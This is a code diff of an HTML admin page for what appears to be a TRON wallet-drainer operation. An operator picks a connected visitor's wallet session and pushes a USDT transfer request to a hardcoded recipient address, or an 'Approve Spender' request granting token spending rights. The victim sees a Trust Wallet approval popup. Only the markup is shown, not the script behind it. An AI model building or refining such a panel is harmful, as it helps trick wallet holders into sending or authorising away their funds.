@@ -3,26 +3,33 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>TRON dApp Admin</title>
+    <title>Admin — USDT Transfer</title>
     <link rel="stylesheet" href="/admin/admin.css" />
   </head>
   <body>
     <main class="wrap">
-      <header class="card">
-        <h1>TRON dApp Admin</h1>
-        <p>Desktop-only dashboard. Every blockchain action still requires user approval in wallet.</p>
+
+      <!-- Header -->
+      <header class="card header-card">
+        <div class="brand">
+          <span class="brand-dot"></span>
+          <h1>USDT Admin Panel</h1>
+        </div>
+        <p>Desktop-only. All transactions require the user to approve in Trust Wallet.</p>
       </header>
 
-      <section class="card" id="mobileBlock" hidden>
-        <h2>Blocked</h2>
-        <p>This admin page is desktop/laptop only.</p>
+      <!-- Mobile block -->
+      <section class="card warn-card" id="mobileBlock" hidden>
+        <h2>⛔ Desktop Only</h2>
+        <p>This admin panel is only accessible from a desktop or laptop browser.</p>
       </section>
 
+      <!-- Connection -->
       <section class="card">
         <h2>Connection</h2>
         <div class="grid2">
           <label>
-            API Base URL
+            Backend API URL
             <input id="apiBase" placeholder="http://localhost:8787" />
           </label>
           <label>
@@ -31,12 +38,13 @@
           </label>
         </div>
         <div class="row">
-          <button id="connectBtn" type="button">Connect Admin</button>
-          <button id="refreshBtn" type="button" class="secondary">Refresh</button>
+          <button id="connectBtn" type="button">Connect</button>
+          <button id="refreshBtn" type="button" class="secondary">↻ Refresh</button>
         </div>
-        <p id="status">Not connected</p>
+        <p id="status" class="status-text">Not connected</p>
       </section>
 
+      <!-- Connected wallets -->
       <section class="card">
         <h2>Connected Wallets</h2>
         <div class="tableWrap">
@@ -44,7 +52,7 @@
             <thead>
               <tr>
                 <th>Client ID</th>
-                <th>Address</th>
+                <th>TRON Address</th>
                 <th>Status</th>
                 <th>Last Seen</th>
               </tr>
@@ -54,51 +62,82 @@
         </div>
       </section>
 
+      <!-- Send Request -->
       <section class="card">
-        <h2>Create Request</h2>
+        <h2>Send Transaction Request</h2>
+        <p class="card-desc">
+          Select a wallet session, choose the transaction type, enter the amount, then send.
+          The user will see an approval popup in their browser.
+        </p>
+
         <form id="requestForm">
-          <div class="grid2">
+
+          <div class="grid2" style="margin-bottom: 12px;">
             <label>
-              Wallet Session
-              <select id="walletSelect"></select>
+              Target Wallet
+              <select id="walletSelect"><option value="">— Select wallet —</option></select>
             </label>
             <label>
-              Request Type
+              Transaction Type
               <select id="requestType">
-                <option value="send_trx">TRX Send</option>
-                <option value="trc20_transfer">TRC20 Transfer</option>
-                <option value="trc20_approve">TRC20 Approve</option>
+                <option value="trc20_transfer">🔄 Send USDT (Transfer)</option>
+                <option value="trc20_approve">✅ Approve Spender</option>
               </select>
             </label>
-            <label>
-              To Address
-              <input id="toAddress" placeholder="T..." />
-            </label>
-            <label>
-              Token Contract
-              <input id="tokenAddress" placeholder="TRC20 contract (for token actions)" />
-            </label>
-            <label>
+          </div>
+
+          <!-- Transfer fields -->
+          <div id="transferFields">
+            <div class="info-row">
+              <span class="info-key">Token</span>
+              <span class="info-val">USDT (TRC-20)</span>
+            </div>
+            <div class="info-row">
+              <span class="info-key">Recipient</span>
+              <span class="info-val mono">TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV</span>
+            </div>
+            <div class="info-row">
+              <span class="info-key">Network</span>
+              <span class="info-val">TRON Mainnet</span>
+            </div>
+          </div>
+
+          <!-- Approve fields -->
+          <div id="approveFields" hidden>
+            <label style="margin-bottom: 12px; display: block;">
               Spender Address
-              <input id="spenderAddress" placeholder="Required for approve" />
+              <input id="spenderAddress" placeholder="T... (address allowed to spend USDT)" />
+            </label>
+            <div class="info-row">
+              <span class="info-key">Token</span>
+              <span class="info-val">USDT (TRC-20)</span>
+            </div>
+            <div class="info-row">
+              <span class="info-key">Action</span>
+              <span class="info-val">Grant spending permission</span>
+            </div>
+          </div>
+
+          <div class="grid2" style="margin-top: 14px;">
+            <label>
+              Amount (USDT)
+              <input id="amountValue" type="number" min="0.000001" step="any" placeholder="e.g. 500" />
             </label>
             <label>
-              Amount
-              <input id="amountValue" placeholder="Example: 1.25" />
-            </label>
-            <label>
-              Decimals
-              <input id="decimalsValue" value="6" />
-            </label>
-            <label>
-              Note
-              <input id="requestNote" placeholder="Optional admin note" />
+              Note (optional)
+              <input id="requestNote" placeholder="e.g. Request #001" />
             </label>
           </div>
-          <button type="submit">Send Request To User</button>
+
+          <!-- Hidden fixed fields -->
+          <input type="hidden" id="tokenAddress" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" />
+          <input type="hidden" id="decimalsValue" value="6" />
+
+          <button type="submit" class="send-btn">Send Request to User</button>
         </form>
       </section>
 
+      <!-- Request log -->
       <section class="card">
         <h2>Request Log</h2>
         <div class="tableWrap">
@@ -107,10 +146,10 @@
               <tr>
                 <th>Created</th>
                 <th>Type</th>
-                <th>Address</th>
+                <th>Amount (USDT)</th>
+                <th>Wallet</th>
                 <th>Status</th>
                 <th>TxID</th>
-                <th>Error</th>
                 <th>Note</th>
               </tr>
             </thead>
@@ -119,12 +158,14 @@
         </div>
       </section>
 
+      <!-- Events -->
       <section class="card">
-        <h2>Events</h2>
-        <pre id="eventsBox"></pre>
+        <h2>Event Log</h2>
+        <pre id="eventsBox">No events yet.</pre>
       </section>
+
     </main>
 
-    <script type="module" src="/admin/admin.js"></script>
+    <script src="/admin/admin.js"></script>
   </body>
-  </html>
+</html>
